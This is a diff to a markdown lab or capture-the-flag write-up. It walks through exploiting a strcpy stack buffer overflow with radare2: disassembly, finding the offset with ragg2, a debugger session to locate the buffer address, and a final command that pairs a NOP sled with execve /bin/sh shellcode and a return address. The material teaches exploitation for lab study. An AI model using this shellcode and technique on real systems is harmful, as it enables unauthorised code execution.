@@ -1185,14 +1185,14 @@ Use `:> s main` to find main(), then `pdf` to 'print disassembly of function' ma
 [0x00400564]> s sym.copy_arg
 [0x00400527]> pdf
  61: sym.copy_arg (int64_t arg1);
-           ; var int64_t var_98h @ rbp-0x98 <- initiate a 64-bit variable at memory address rbp-0x98
-           ; var int64_t var_90h @ rbp-0x90 <- initiate a 64-bit variable at memory address rbp-0x90, 8-bytes closer to rbp, giving it 152 bytes to accommodate the buffer plus any alignment values.
+           ; var int64_t var_98h @ rbp-0x98 <- initiate a 64-bit variable at memory address rbp-0x98 (this is a subtraction expression)
+           ; var int64_t var_90h @ rbp-0x90 <- initiate a 64-bit variable at memory address rbp-0x90, 8-bytes closer to rbp, giving it 152 bytes to accommodate the buffer plus any alignment values. (also a subtraction expression)
            ; arg int64_t arg1 @ rdi <- document a function paramter, pointing arg1 to the memory location of rdi
            ; CALL XREF from main @ 0x40058b
            0x00400527      55             push rbp
            0x00400528      4889e5         mov rbp, rsp ; <- creates a static reference point that saves the beginning of the stack
            0x0040052b      4881eca00000.  sub rsp, 0xa0 ; <- allocate 160 bytes (10*16 + 0 * 16) stack space for this function; subtracts 160 bytes from rsp to move it lower int the stacking, making room for local variables
-           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1 <- rdi is currently storing the memory address of argv[1]. This will move that memory address from rdi as teh value contained in var_98h, at memory address rbp-0x98.
+           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1 <- rdi is currently storing the memory address of argv[1]. This will move that memory address from rdi as the value contained in var_98h, at memory address rbp-0x98.
            0x00400539      488b9568ffff.  mov rdx, qword [var_98h] ; <-the presence of the brackets moves the value stored at rbp-0x98 to memory location rdx. RDX now contains the pointer to argv[1]
            0x00400540      488d8570ffff.  lea rax, [var_90h] ; <- go to the contents of variable var_90h. Determine the memory address where the value starts, load that address into rax.
            0x00400547      4889d6         mov rsi, rdx ; <- moves the contents of rdi (the pointer to argv[1]) to rsi
@@ -1302,7 +1302,7 @@ rflags = 0x00000206
 orax = 0xffffffffffffffff
 
 ```
-We can find the exact offset by querying the pattern at `rbp`: `ragg2 -q 0x4179414178414177  
+We can find the exact offset by querying the pattern at `rbp`: `ragg2 -q 0x4179414178414177 ` 
 
 ```md
 [0x00400563]> ragg2 -q 0x4179414178414177
@@ -1319,36 +1319,123 @@ the Saved Return Address, then, begins at 152 bytes.
 
 Since the compromised return address must be within the NOP sled, we need to identify the runtime address of the buffer.
 
+From the earlier printout of sym.copy_arg `var int64_t var_90h @ rbp-0x90 ; <- We want this memory address`  
+We can restart the program to have a clean set of memory registers.
+
+`:> r2 -d ./buffer-overflow AAAA`
+
+Set a breakpoint at the beginning of the sym.copy_arg function: `0x00400527      55             push rbp`  with `db 0x00400527`
+Set another breakpoint where at the "load effective address" instruction : `0x00400540      488d8570ffff.  lea rax, [var_90h]` with `db 0x00400540`  
+
 ```md
-[0x00400527]> s sym.copy_arg
-[0x00400527]> pdf
-61: sym.copy_arg (int64_t arg1);
-           ; var int64_t var_98h @ rbp-0x98
-           ; var int64_t var_90h @ rbp-0x90
-           ; arg int64_t arg1 @ rdi
-           ; CALL XREF from main @ 0x40058b
-           0x00400527      55             push rbp
-           0x00400528      4889e5         mov rbp, rsp
-           0x0040052b      4881eca00000.  sub rsp, 0xa0
-           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1
-           0x00400539      488b9568ffff.  mov rdx, qword [var_98h]
-           0x00400540      488d8570ffff.  lea rax, [var_90h]
-           0x00400547      4889d6         mov rsi, rdx
-           0x0040054a      4889c7         mov rdi, rax
-           0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
-           0x00400552      488d8570ffff.  lea rax, [var_90h]
-           0x00400559      4889c7         mov rdi, rax
-           0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s)
-           0x00400561      90             nop
-           0x00400562      c9             leave
-           ;-- rip:
-           0x00400563      c3             ret
-[0x00400527]> 
+r2 -d ./buffer-overflow AAAA
+Process with PID 13072 started...
+= attach 13072 13072
+bin.baddr 0x00400000
+Using 0x400000
+asm.bits 64
+ -- Don't trust what can't be compiled
+[0x7ffff7dd9ef0]> db 0x00400527
+[0x7ffff7dd9ef0]> db 0x00400540
+[0x7ffff7dd9ef0]> 
 
 ```
 
+The output from this is: 
+```asm
+r2 -d ./buffer-overflow AAAA
+Process with PID 13072 started...
+= attach 13072 13072
+bin.baddr 0x00400000
+Using 0x400000
+asm.bits 64
+ -- Don't trust what can't be compiled
+[0x7ffff7dd9ef0]> db 0x00400527
+[0x7ffff7dd9ef0]> db 0x00400540
+[0x7ffff7dd9ef0]> dc
+Here's a program that echo's out your input
+hit breakpoint at: 400527
+[0x00400527]> dr
+rax = 0x7fffffffe6cb
+rbx = 0x00000000
+rcx = 0x7ffff7b0d584
+rdx = 0x7ffff7dd58c0
+r8 = 0x00000003
+r9 = 0x00000077
+r10 = 0x00000000
+r11 = 0x00000246
+r12 = 0x00400450
+r13 = 0x7fffffffe470
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x00602260
+rdi = 0x7fffffffe6cb
+rsp = 0x7fffffffe378
+rbp = 0x7fffffffe390
+rip = 0x00400527
+rflags = 0x00000212
+orax = 0xffffffffffffffff
+[0x00400527]> dc
+hit breakpoint at: 400540
+[0x00400540]> dr
+rax = 0x7fffffffe6cb
+rbx = 0x00000000
+rcx = 0x7ffff7b0d584
+rdx = 0x7fffffffe6cb
+r8 = 0x00000003
+r9 = 0x00000077
+r10 = 0x00000000
+r11 = 0x00000246
+r12 = 0x00400450
+r13 = 0x7fffffffe470
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x00602260
+rdi = 0x7fffffffe6cb
+rsp = 0x7fffffffe2d0
+rbp = 0x7fffffffe370
+rip = 0x00400540
+rflags = 0x00000202
+orax = 0xffffffffffffffff
+```
+As expected, `rax` has not updated because we are paused at the instruction, before it executes.  
+We will step forward one instruction with `:> ds`  
+```md
+[0x00400540]> ds
+[0x00400540]> dr
+rax = 0x7fffffffe2e0
+rbx = 0x00000000
+rcx = 0x7ffff7b0d584
+rdx = 0x7fffffffe6cb
+r8 = 0x00000003
+r9 = 0x00000077
+r10 = 0x00000000
+r11 = 0x00000246
+r12 = 0x00400450
+r13 = 0x7fffffffe470
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x00602260
+rdi = 0x7fffffffe6cb
+rsp = 0x7fffffffe2d0
+rbp = 0x7fffffffe370
+rip = 0x00400547
+rflags = 0x00000202
+orax = 0xffffffffffffffff
+[0x00400540]> 
+```
+`rax` is now set to `0x7fffffffe2e0`  
+`rbp` is now set to `0x7fffffffe370`
+
+What we are looking for `rbp-0x90`.
+
+We can verify with a ![Hex Calculator](https://www.rapidtables.com/calc/math/hex-calculator.html)
+
+![Buffer Runtime Address](assets/buffer-overflow-18-task8-7.png)  
+
+After translation from big-endian to little-endian our return address can start at `\xe0\xe2\xff\xff\xff\x7f\x00\x00`
 
 
-`:> ./buffer-overflow $(python -c print( ()'\x90' * 121) + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + [8-byte compromised return address within the NOPs])`
+The attack command, then can become:  
 
-
+`:> ./buffer-overflow $(python -c "print('\x90'*121 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\xe0\xe2\xff\xff\xff\x7f\x00\x00')")`
